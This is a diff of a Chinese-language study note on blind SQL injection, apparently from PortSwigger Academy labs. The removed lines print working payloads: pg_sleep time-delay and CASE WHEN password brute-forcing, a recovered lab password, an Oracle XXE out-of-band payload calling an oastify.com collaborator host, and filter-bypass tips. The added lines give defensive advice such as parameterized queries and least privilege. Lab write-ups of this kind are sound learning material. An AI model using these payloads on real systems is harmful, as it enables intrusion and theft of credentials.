+);
+statement.setString(1, input);
+ResultSet resultSet = statement.executeQuery();
 ```
 
-### Step 2: 多语句注入 vs 表达式注入
+**关键约束**：参数化查询的有效性要求查询字符串始终是硬编码常量。不得依据任何运行时变量的内容决定是否使用字符串拼接——即使是"看起来可信"的数据。数据来源可能被其他代码变更无意中污染。
 
-```sql
--- 表达式注入（当前生效的方式）
-' || pg_sleep(10) --
+### 2. 参数化查询无法覆盖的场景
 
--- 多语句注入（需要分号）
-'; SELECT pg_sleep(10) --
-```
+参数化查询不适用于以下 SQL 部分：
+- 表名或列名
+- `ORDER BY` 子句
 
-| 方式 | 语法 | 适用场景 |
-|------|------|----------|
-| 表达式注入 | `' \|\| pg_sleep(10) --` | 作为字符串连接或布尔表达式的一部分 |
-| 多语句注入 | `'; SELECT pg_sleep(10) --` | 数据库/驱动支持多语句执行 |
+对这类场景需采用：
+- **白名单校验**：仅允许预定义的合法值
+- **不同的逻辑路径**：用条件分支而非直接的字符串拼接
 
-**注意**：cookie 中直接使用分号 `;` 可能被解析为 cookie 分隔符，需要 URL 编码为 `%3B`。
+### 3. 纵深防御补充措施
 
-```sql
-TrackingId=qp5zQHYcGlRtSzCL' %3B SELECT pg_sleep(10) --+
-```
+- 遵循数据库账户最小权限原则（应用账户通常只需 `SELECT`/`INSERT`/`UPDATE`，不应有 `DROP`/`ALTER`/`FILE`）
+- 禁用详细数据库错误信息直接回显到前端
+- WAF 作为额外防线（但不能替代参数化查询）
 
-### Step 3: 验证 CASE WHEN 条件延迟可用
+### 4. 盲注的防御
 
-```sql
-TrackingId=qp5zQHYcGlRtSzCL' %3B SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END --+
--- 结果：触发 4 秒延迟 → 可用
-```
-
-### Step 4: 确定密码长度
-
-```sql
-TrackingId=qp5zQHYcGlRtSzCL' %3B SELECT CASE WHEN (LENGTH(password)=§1§) THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users WHERE username='administrator' --+
-```
-
-Burp Intruder Sniper 模式。
-**结果**：长度 = 20
-
-### Step 5: 逐字符爆破密码
-
-```sql
-TrackingId=qp5zQHYcGlRtSzCL' %3B SELECT CASE WHEN (SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users WHERE username='administrator' --+
-```
-
-**时间盲注提示**：Burp Intruder 攻击完成后，按 "Response received" 列排序，延迟 4 秒以上的响应就是正确字符。
-
-**最终密码**：`jhyiwckngv95rr8fi58x`
+防止盲 SQL 注入的措施与常规 SQL 注入完全相同。参数化查询能确保所有形式的 SQL 注入——无论带内还是带外——都无法利用，因为它从根本上去除了用户输入影响查询结构的可能性。
 
 ---
 
-## Lab 5: Blind SQL injection with out-of-band interaction
+## 盲注技术能力递进总结
 
-- **注入点**：Cookie 参数 `TrackingId`
-- **数据库**：Oracle
-- **策略**：带外交互法 —— 利用 Oracle XML 函数发起外部 DNS/HTTP 请求
-- **目标**：验证 OOB 通道可行性（本 Lab 只需触发 DNS 查询）
+盲 SQL 注入的技术选择取决于应用程序对查询结果和错误的处理方式，按适用条件递进：
 
-### Step 1: 获取 Burp Collaborator 子域名
+| 技术 | 前提条件 | 效率 |
+|------|---------|------|
+| 条件布尔响应 | 应用根据查询结果改变行为 | 逐字符（二分查找可加速） |
+| 条件错误 | 应用行为不变但数据库错误产生差异 | 逐字符 |
+| 详细错误消息 | 错误消息包含查询数据 | 直接获取（最优） |
+| 时间延迟 | 无任何可观察差异但有同步响应 | 逐字符（最慢） |
+| OAST 带外 | 异步查询 + 数据库有网络出站能力 | 直接外带数据（最快） |
 
-```
-f6m4x36e7l55drydz4qxh5ez3q9hxmlb.oastify.com
-```
-
-### Step 2: 构造 XXE + SQL 注入组合 Payload
-
-原始 payload（含格式化）：
-
-```sql
-TrackingId=6OaAmWTgObppj28w' UNION SELECT EXTRACTVALUE(
-    xmltype(
-        '<?xml version="1.0" encoding="UTF-8"?>
-        <!DOCTYPE root [
-            <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">
-            %remote;
-        ]>'
-    ),
-    '/l'
-) FROM dual--
-```
-
-**Payload 语法解析**：
-
-| 组件 | 作用 |
-|------|------|
-| `6OaAmWTgObppj28w'` | 闭合原始查询字符串 |
-| `UNION SELECT` | 联合查询，注入恶意 payload |
-| `EXTRACTVALUE(xmltype(...), '/l')` | Oracle XML 函数，解析 XML 并触发外部实体 |
-| `<!ENTITY % remote SYSTEM "http://.../">` | XXE：声明外部实体，指向 Collaborator 地址 |
-| `%remote;` | 引用实体，触发 DNS/HTTP 请求 |
-| `FROM dual` | Oracle 必需的虚拟表 |
-| `--` | 注释掉后续 SQL |
-
-### Step 3: URL 编码（关键！）
-
-XML 中的特殊字符必须编码，且**不能保留格式化（换行、缩进）**——否则会破坏 SQL 语法。
-
-| 编码 | 原始字符 |
-|------|----------|
-| `%3f` | `?` |
-| `%3d` | `=` |
-| `%22` | `"` |
-| `%3a` | `:` |
-| `%25` | `%` |
-| `%3b` | `;` |
-
-**最终发送的 payload（无格式化，已 URL 编码）**：
-
-```
-6OaAmWTgObppj28w' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://f6m4x36e7l55drydz4qxh5ez3q9hxmlb.oastify.com/">%remote;]>'),'/l') FROM dual--
-```
-
-### Step 4: 验证结果
-
-在 Burp Collaborator 中查看 DNS/HTTP 请求记录，确认 Oracle 数据库发起了外部请求。
+> OAST 技术因其高成功率和直接外带数据的能力，即使在其他盲注技术也可行时，仍往往是更优选择。
 
 ---
 
-## 各 Lab 策略对比总结
-
-| | Lab 1 | Lab 2 | Lab 3 | Lab 4 | Lab 5 |
-|---|---|---|---|---|---|
-| **数据库** | PostgreSQL | Oracle | PostgreSQL | PostgreSQL | Oracle |
-| **策略** | 条件响应 | 条件错误 | 可见错误 | 时间延迟 | 带外交互 |
-| **判断依据** | "Welcome back" 的出现/消失 | HTTP 500 的出现/消失 | 错误消息内容 | 响应时间差异 | DNS 查询记录 |
-| **效率** | 高（直接看响应） | 中（需要区分错误类型） | 极高（直接泄露数据） | 低（每次请求需等待） | 低（依赖外部服务） |
-| **核心技巧** | 布尔表达式 + 内容差异 | `TO_CHAR(1/0)` 制造可控错误 | `CAST()` 将数据嵌入错误消息 | `pg_sleep()` 延迟函数 | Oracle XML + XXE 外带 |
-| **特殊注意** | 简单的布尔盲注 | Oracle 特有语法（`dual`, `ROWNUM`, `\|\|`） | 删除原始值释放字符空间 | 分号需 URL 编码 | XML 需 URL 编码 + 去格式化 |
-
----
-
-## 补充：通用思路框架
-
-```
-1. 探测注入点
-   ├── 输入 '  观察响应变化
-   ├── 输入 '' 或 --  确认语法修复
-   └── 确定闭合方式（字符串型/数字型；cookie/GET/POST）
-
-2. 识别数据库类型
-   ├── Oracle: dual 表, ROWNUM, TO_CHAR(1/0), || 连接
-   ├── PostgreSQL: pg_sleep(), SUBSTRING(), LIMIT
-   └── MySQL: SLEEP(), # 注释, CONCAT()
-
-3. 选择盲注策略（按优先级）
-   ├── 页面有内容差异 → 条件响应法（Lab 1）
-   ├── 错误信息可见/状态码可区分 → 条件错误法（Lab 2）
-   ├── 错误消息回显 → 可见错误法（Lab 3）★ 最高效
-   ├── 仅有响应时间可观测 → 时间延迟法（Lab 4）
-   └── 数据库可出站 → 带外交互法（Lab 5）
-
-4. 数据提取（三步）
-   ├── 确认表/行存在 → 确认目标数据长度 → 逐字符爆破
-   └── 工具：Burp Intruder (Sniper 测长度, Cluster bomb 爆字符)
-
-5. 遇到障碍时
-   ├── Payload 被截断 → 删除原始值释放空间 / 缩短 payload
-   ├── 特殊字符失效 → URL 编码（尤其 cookie 中的 ; 需要 %3B）
-   ├── 注释符失效 → 换用 # 或 /* */ 或闭合后续语法
-   └── 关键词被过滤 → 尝试大小写混写 / 双写绕过 / 等价函数替换
-```
+> **文档类型**：漏洞分析文档
+> **关联概念**：[[Blind SQL injection]], [[SQL injection cheat sheet]], [[Cross-site scripting (XSS)]], [[Server-Side Template Injection (SSTI)]]
+> **参考来源**：PortSwigger Academy: SQL injection, OWASP Top 10 (2021): A03 Injection, CWE-89: SQL Injection
